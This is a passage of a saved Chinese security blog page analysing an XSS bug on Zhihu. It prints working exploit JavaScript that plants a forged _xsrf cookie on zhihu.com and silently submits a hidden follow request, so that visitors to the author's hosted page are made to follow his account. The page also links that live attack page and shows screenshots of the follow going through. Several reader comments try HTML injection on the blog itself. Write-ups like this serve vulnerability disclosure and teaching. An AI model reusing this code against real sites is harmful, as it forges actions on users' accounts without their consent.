class="o">=</span><span class="nx">c</span><span class="p">.</span><span class="nx">dom</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="s2">"div"</span><span class="p">);</span><span class="nx">e</span><span class="p">.</span><span class="nx">innerHTML</span><span class="o">=</span><span class="nx">a</span><span class="p">;</span><span class="nx">e</span><span class="o">=</span><span class="nx">e</span><span class="p">.</span><span class="nx">children</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="nx">b</span><span class="o">&amp;&amp;</span><span class="s2">"function"</span><span class="o">!=</span><span class="k">typeof</span> <span class="nx">b</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="o">=</span><span class="s2">"none"</span><span class="p">);</span><span class="k">this</span><span class="p">.</span><span class="nx">insert</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="nx">d</span><span class="p">,</span><span class="s2">"function"</span><span class="o">==</span><span class="k">typeof</span> <span class="nx">f</span><span class="o">&amp;&amp;</span><span class="nx">f</span><span class="p">);</span><span class="k">return</span> <span class="nx">e</span><span class="p">},</span><span class="nx">create</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">){</span><span class="kd">var</span> <span class="nx">d</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span><span class="k">for</span><span class="p">(</span><span class="nx">i</span> <span class="k">in</span> <span class="nx">b</span><span class="p">)</span><span class="s2">"string"</span><span class="o">==</span><span class="k">typeof</span> <span class="nx">b</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">&amp;&amp;</span><span class="k">this</span><span class="p">.</span><span class="nx">attr</span><span class="p">(</span><span class="nx">d</span><span class="p">,</span><span class="nx">i</span><span class="p">,</span><span class="nx">b</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span><span class="k">return</span> <span class="nx">d</span><span class="p">},</span><span class="nx">insert</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">){</span><span class="kd">var</span> <span class="nx">d</span><span class="o">=</span><span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">slice</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">arguments</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span><span class="nx">b</span><span class="o">=</span><span class="nx">b</span><span class="o">&amp;&amp;</span><span class="nx">c</span><span class="p">.</span><span class="nx">get</span><span class="p">.</span><span class="nx">isdom</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span><span class="o">?</span><span class="nx">b</span><span class="o">:</span><span class="nx">c</span><span class="p">.</span><span class="nx">get</span><span class="p">.</span><span class="nx">body</span><span class="p">();</span><span class="nx">b</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span><span class="s2">"function"</span><span class="o">==</span><span class="k">typeof</span> <span class="nx">d</span><span class="o">&amp;&amp;</span><span class="nx">d</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">);</span><span class="k">return</span> <span class="nx">a</span><span class="p">},</span><span class="nx">add</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">,</span><span class="nx">d</span><span class="p">){</span><span class="kd">var</span> <span class="nx">c</span><span class="o">=</span><span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">slice</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">arguments</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span><span class="nx">e</span><span class="o">=</span><span class="k">this</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">);</span><span class="k">this</span><span class="p">.</span><span class="nx">insert</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="nx">d</span><span class="p">,</span><span class="nx">c</span><span class="p">);</span><span class="k">return</span> <span class="nx">e</span><span class="p">},</span><span class="nx">kill</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">){</span><span class="kd">var</span> <span class="nx">b</span><span class="o">=</span><span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">slice</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">arguments</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span><span class="nx">c</span><span class="p">.</span><span class="nx">get</span><span class="p">.</span><span class="nx">isdom</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nx">a</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span><span class="s2">"function"</span><span class="o">==</span><span class="k">typeof</span> <span class="nx">b</span><span class="o">&amp;&amp;</span><span class="nx">b</span><span class="p">()},</span><span class="nx">attr</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">,</span><span class="nx">c</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">c</span><span class="p">)</span><span class="k">return</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">attributes</span><span class="p">[</span><span class="nx">b</span><span class="p">]</span><span class="o">||</span><span class="p">{}).</span><span class="nx">value</span><span class="p">;</span><span class="nx">a</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span><span class="nx">c</span><span class="p">);</span><span class="k">return</span> <span class="nx">a</span><span class="p">}};</span><span class="nx">c</span><span class="p">.</span><span class="nx">req</span><span class="o">=</span><span class="p">{</span><span class="nx">post</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">,</span><span class="nx">d</span><span class="p">){</span><span class="kd">var</span> <span class="nx">f</span><span class="o">=</span><span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">slice</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">arguments</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span><span class="nx">e</span><span class="o">=</span><span class="nx">c</span><span class="p">.</span><span class="nx">dom</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">"form"</span><span class="p">,{</span><span class="nx">method</span><span class="o">:</span><span class="s2">"POST"</span><span class="p">,</span><span class="nx">style</span><span class="o">:</span><span class="s2">"display: none;"</span><span class="p">,</span><span class="nx">action</span><span class="o">:</span><span class="nx">a</span><span class="p">},</span><span class="nx">c</span><span class="p">.</span><span class="nx">get</span><span class="p">.</span><span class="nx">body</span><span class="p">());</span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="o">&amp;&amp;</span><span class="s2">"object"</span><span class="o">==</span><span class="k">typeof</span> <span class="nx">b</span><span class="p">)</span><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">g</span> <span class="k">in</span> <span class="nx">b</span><span class="p">)</span><span class="nx">c</span><span class="p">.</span><span class="nx">dom</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">"input"</span><span class="p">,{</span><span class="nx">name</span><span class="o">:</span><span class="nx">g</span><span class="p">,</span><span class="nx">value</span><span class="o">:</span><span class="nx">b</span><span class="p">[</span><span class="nx">g</span><span class="p">]},</span><span class="nx">e</span><span class="p">);</span><span class="nx">g</span><span class="o">=</span><span class="nx">c</span><span class="p">.</span><span class="nx">dom</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">"input"</span><span class="p">,{</span><span class="nx">type</span><span class="o">:</span><span class="s2">"submit"</span><span class="p">},</span><span class="nx">e</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">d</span><span class="o">||</span><span class="s2">"function"</span><span class="o">==</span><span class="k">typeof</span> <span class="nx">d</span><span class="p">){</span><span class="kd">var</span> <span class="nx">h</span><span class="o">=</span><span class="nx">c</span><span class="p">.</span><span class="nx">dom</span><span class="p">.</span><span class="nx">inner</span><span class="p">(</span><span class="s1">'&lt;iframe sandbox name="'</span><span class="o">+</span><span class="nx">c</span><span class="p">.</span><span class="nx">op</span><span class="p">.</span><span class="nx">random</span><span class="p">(</span><span class="o">!</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="s1">'"&gt;'</span><span class="p">,</span><span class="o">!</span><span class="mi">0</span><span class="p">);</span><span class="nx">c</span><span class="p">.</span><span class="nx">dom</span><span class="p">.</span><span class="nx">attr</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="s2">"target"</span><span class="p">,</span><span class="nx">h</span><span class="p">.</span><span class="nx">name</span><span class="p">)}</span><span class="s2">"function"</span><span class="o">==</span><span class="k">typeof</span> <span class="nx">f</span><span class="o">&amp;&amp;</span><span class="nx">c</span><span class="p">.</span><span class="nx">op</span><span class="p">.</span><span class="nx">bind</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="s2">"submit"</span><span class="p">,</span><span class="nx">f</span><span class="p">);</span><span class="nx">d</span><span class="o">&amp;&amp;</span><span class="s2">"function"</span><span class="o">!=</span><span class="k">typeof</span> <span class="nx">d</span><span class="o">||</span><span class="nx">c</span><span class="p">.</span><span class="nx">op</span><span class="p">.</span><span class="nx">bind</span><span class="p">(</span><span class="nx">h</span><span class="p">,</span><span class="s2">"load"</span><span class="p">,</span><span class="kd">function</span><span class="p">(){</span><span class="nx">c</span><span class="p">.</span><span class="nx">dom</span><span class="p">.</span><span class="nx">kill</span><span class="p">(</span><span class="nx">h</span><span class="p">)});</span><span class="nx">g</span><span class="p">.</span><span class="nx">click</span><span class="p">();</span><span class="nx">d</span><span class="o">&amp;&amp;</span><span class="s2">"function"</span><span class="o">!=</span><span class="k">typeof</span> <span class="nx">d</span><span class="o">||</span><span class="nx">c</span><span class="p">.</span><span class="nx">dom</span><span class="p">.</span><span class="nx">kill</span><span class="p">(</span><span class="nx">e</span><span class="p">)}};</span><span class="k">return</span> <span class="nx">c</span><span class="p">}();</span>
+<span class="kd">function</span> <span class="nx">createCookie</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span><span class="nx">value</span><span class="p">,</span><span class="nx">days</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">days</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">date</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
+        <span class="nx">date</span><span class="p">.</span><span class="nx">setTime</span><span class="p">(</span><span class="nx">date</span><span class="p">.</span><span class="nx">getTime</span><span class="p">()</span><span class="o">+</span><span class="p">(</span><span class="nx">days</span><span class="o">*</span><span class="mi">24</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">1000</span><span class="p">));</span>
+        <span class="kd">var</span> <span class="nx">expires</span> <span class="o">=</span> <span class="s2">"; expires="</span><span class="o">+</span><span class="nx">date</span><span class="p">.</span><span class="nx">toGMTString</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="kd">var</span> <span class="nx">expires</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="nx">name</span><span class="o">+</span><span class="s2">"="</span><span class="o">+</span><span class="nx">value</span><span class="o">+</span><span class="nx">expires</span><span class="o">+</span><span class="s2">"; path=/; domain=.zhihu.com"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nx">createCookie</span><span class="p">(</span><span class="s2">"_xsrf"</span><span class="p">,</span> <span class="s2">"wooyun123123"</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+<span class="nx">love</span><span class="p">.</span><span class="nx">req</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">"https://www.zhihu.com/node/MemberFollowBaseV2"</span><span class="p">,</span> <span class="p">{</span>
+    <span class="nx">method</span><span class="o">:</span> <span class="s2">"follow_member"</span><span class="p">,</span>
+    <span class="nx">params</span><span class="o">:</span> <span class="s1">'{"hash_id":"6f8ffd80705c262c2ee3fa4d9b3f8f06"}'</span><span class="p">,</span>
+    <span class="nx">_xsrf</span><span class="o">:</span> <span class="s2">"wooyun123123"</span>
+<span class="p">},</span> <span class="kc">true</span><span class="p">);</span> 
+</pre></div>
+<p>可见，我将_xsrf设置为wooyun123123，hash_id是被关注人的id，可以通过抓包获得。<br/>
+用户访问 <a href="http://mhz.pw/game/zhihu/zhihu.html"><a href="http://mhz.pw/game/zhihu/zhihu.html">http://mhz.pw/game/zhihu/zhihu.html</a></a> 即可关注我。通过抓包可以看见，我们伪造的_xsrf已经附在cookie最后面传给服务端了：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201604/fb5c1460877347.png"><img alt="2.png" src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/thum-fb5c1460877347.png"/></a></p>
+<p>用户已成功关注：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201604/10fb1460877348.png"><img alt="3.png" src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/thum-10fb1460877348.png"/></a></p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2489">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/f73f1f3444874800089d11d9abb8262e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">1424</a>
+<time datetime="2016年12月7日 15:42" itemprop="datePublished">
+                            2016 十二月 07 15:42
+                        </time>
+<a href="javascript:reply_to('2489', '1424')">回复</a>
+</p>
+<p class="comment-meta">&lt;/p&gt;sdadasd阿大声道&lt;a%20href="http://geek.csdn.net/"&gt;33333333333333333&lt;/a&gt;</p>
+</div>
+</div>
+<div class="row" id="comment-2488">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/f73f1f3444874800089d11d9abb8262e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">1424</a>
+<time datetime="2016年12月7日 15:41" itemprop="datePublished">
+                            2016 十二月 07 15:41
+                        </time>
+<a href="javascript:reply_to('2488', '1424')">回复</a>
+</p>
+<p class="comment-meta">"/&gt;&lt;a%20href="http://geek.csdn.net/"&gt;33333333333333333&lt;/a&gt;&lt;input%20"  <br/><br/><br/>sdadasd阿大声道</p>
+</div>
+</div>
+<div class="row" id="comment-2463">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/2ef318db646a4553c093a81e3808b2fa.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.cnbraid.com" target="_blank">HackBraid</a>
+<time datetime="2016年10月27日 09:52" itemprop="datePublished">
+                            2016 十月 27 09:52
+                        </time>
+<a href="javascript:reply_to('2463', 'HackBraid')">回复</a>
+</p>
+<p class="comment-meta">学习了，楼主的研究思维让人印象深刻！</p>
+</div>
+</div>
+<div class="row" id="comment-2453">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">r0gent</a>
+<time datetime="2016年10月21日 17:08" itemprop="datePublished">
+                            2016 十月 21 17:08
+                        </time>
+<a href="javascript:reply_to('2453', 'r0gent')">回复</a>
+</p>
+<p class="comment-meta">很经典，Tornado和Cookie.SimpleCookie都去跟了一波，楼主果然分析的够仔细。</p>
+</div>
+</div>
+<div class="row" id="comment-2443">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">红尘</a>
+<time datetime="2016年9月26日 22:03" itemprop="datePublished">
+                            2016 九月 26 22:03
+                        </time>
+<a href="javascript:reply_to('2443', '红尘')">回复</a>
+</p>
+<p class="comment-meta">厉害学习涨姿势</p>
+</div>
+</div>
+<div class="row" id="comment-2338">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.luckyscript.me" target="_blank">luckyscript</a>
+<time datetime="2016年5月26日 23:56" itemprop="datePublished">
+                            2016 五月 26 23:56
+                        </time>
+<a href="javascript:reply_to('2338', 'luckyscript')">回复</a>
+</p>
+<p class="comment-meta">学习了，顺便关注学长知乎一波～～</p>
+</div>
+</div>
+<div class="row" id="comment-2323">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/ea566ca52afef018b42889af34a28258.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="https://wujunze.com/" target="_blank">钧泽</a>
+<time datetime="2016年4月18日 12:48" itemprop="datePublished">
+                            2016 四月 18 12:48
+                        </time>
+<a href="javascript:reply_to('2323', '钧泽')">回复</a>
+</p>
+<p class="comment-meta">很经典的洞</p>
+</div>
+</div>
+<div class="row" id="comment-2322">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/8ce5d69a9794c4cd2491b12452012981.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://blog.antior.cn" target="_blank">antior</a>
+<time datetime="2016年4月17日 20:42" itemprop="datePublished">
+                            2016 四月 17 20:42
+                        </time>
+<a href="javascript:reply_to('2322', 'antior')">回复</a>
+</p>
+<p class="comment-meta">好玩</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="9010bbf3e3f1009fd6da055f5f2fc91902a42cf5"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/9010bbf3e3f1009fd6da055f5f2fc91902a42cf5"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="384">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="13xPgBb1nOw8EKb9VtBecftnse6VqCJ6znSl45ngOBqxEpzoJK5YLTvsBiz396yg"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./知乎某处XSS+刷粉超详细漏洞技术分析  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
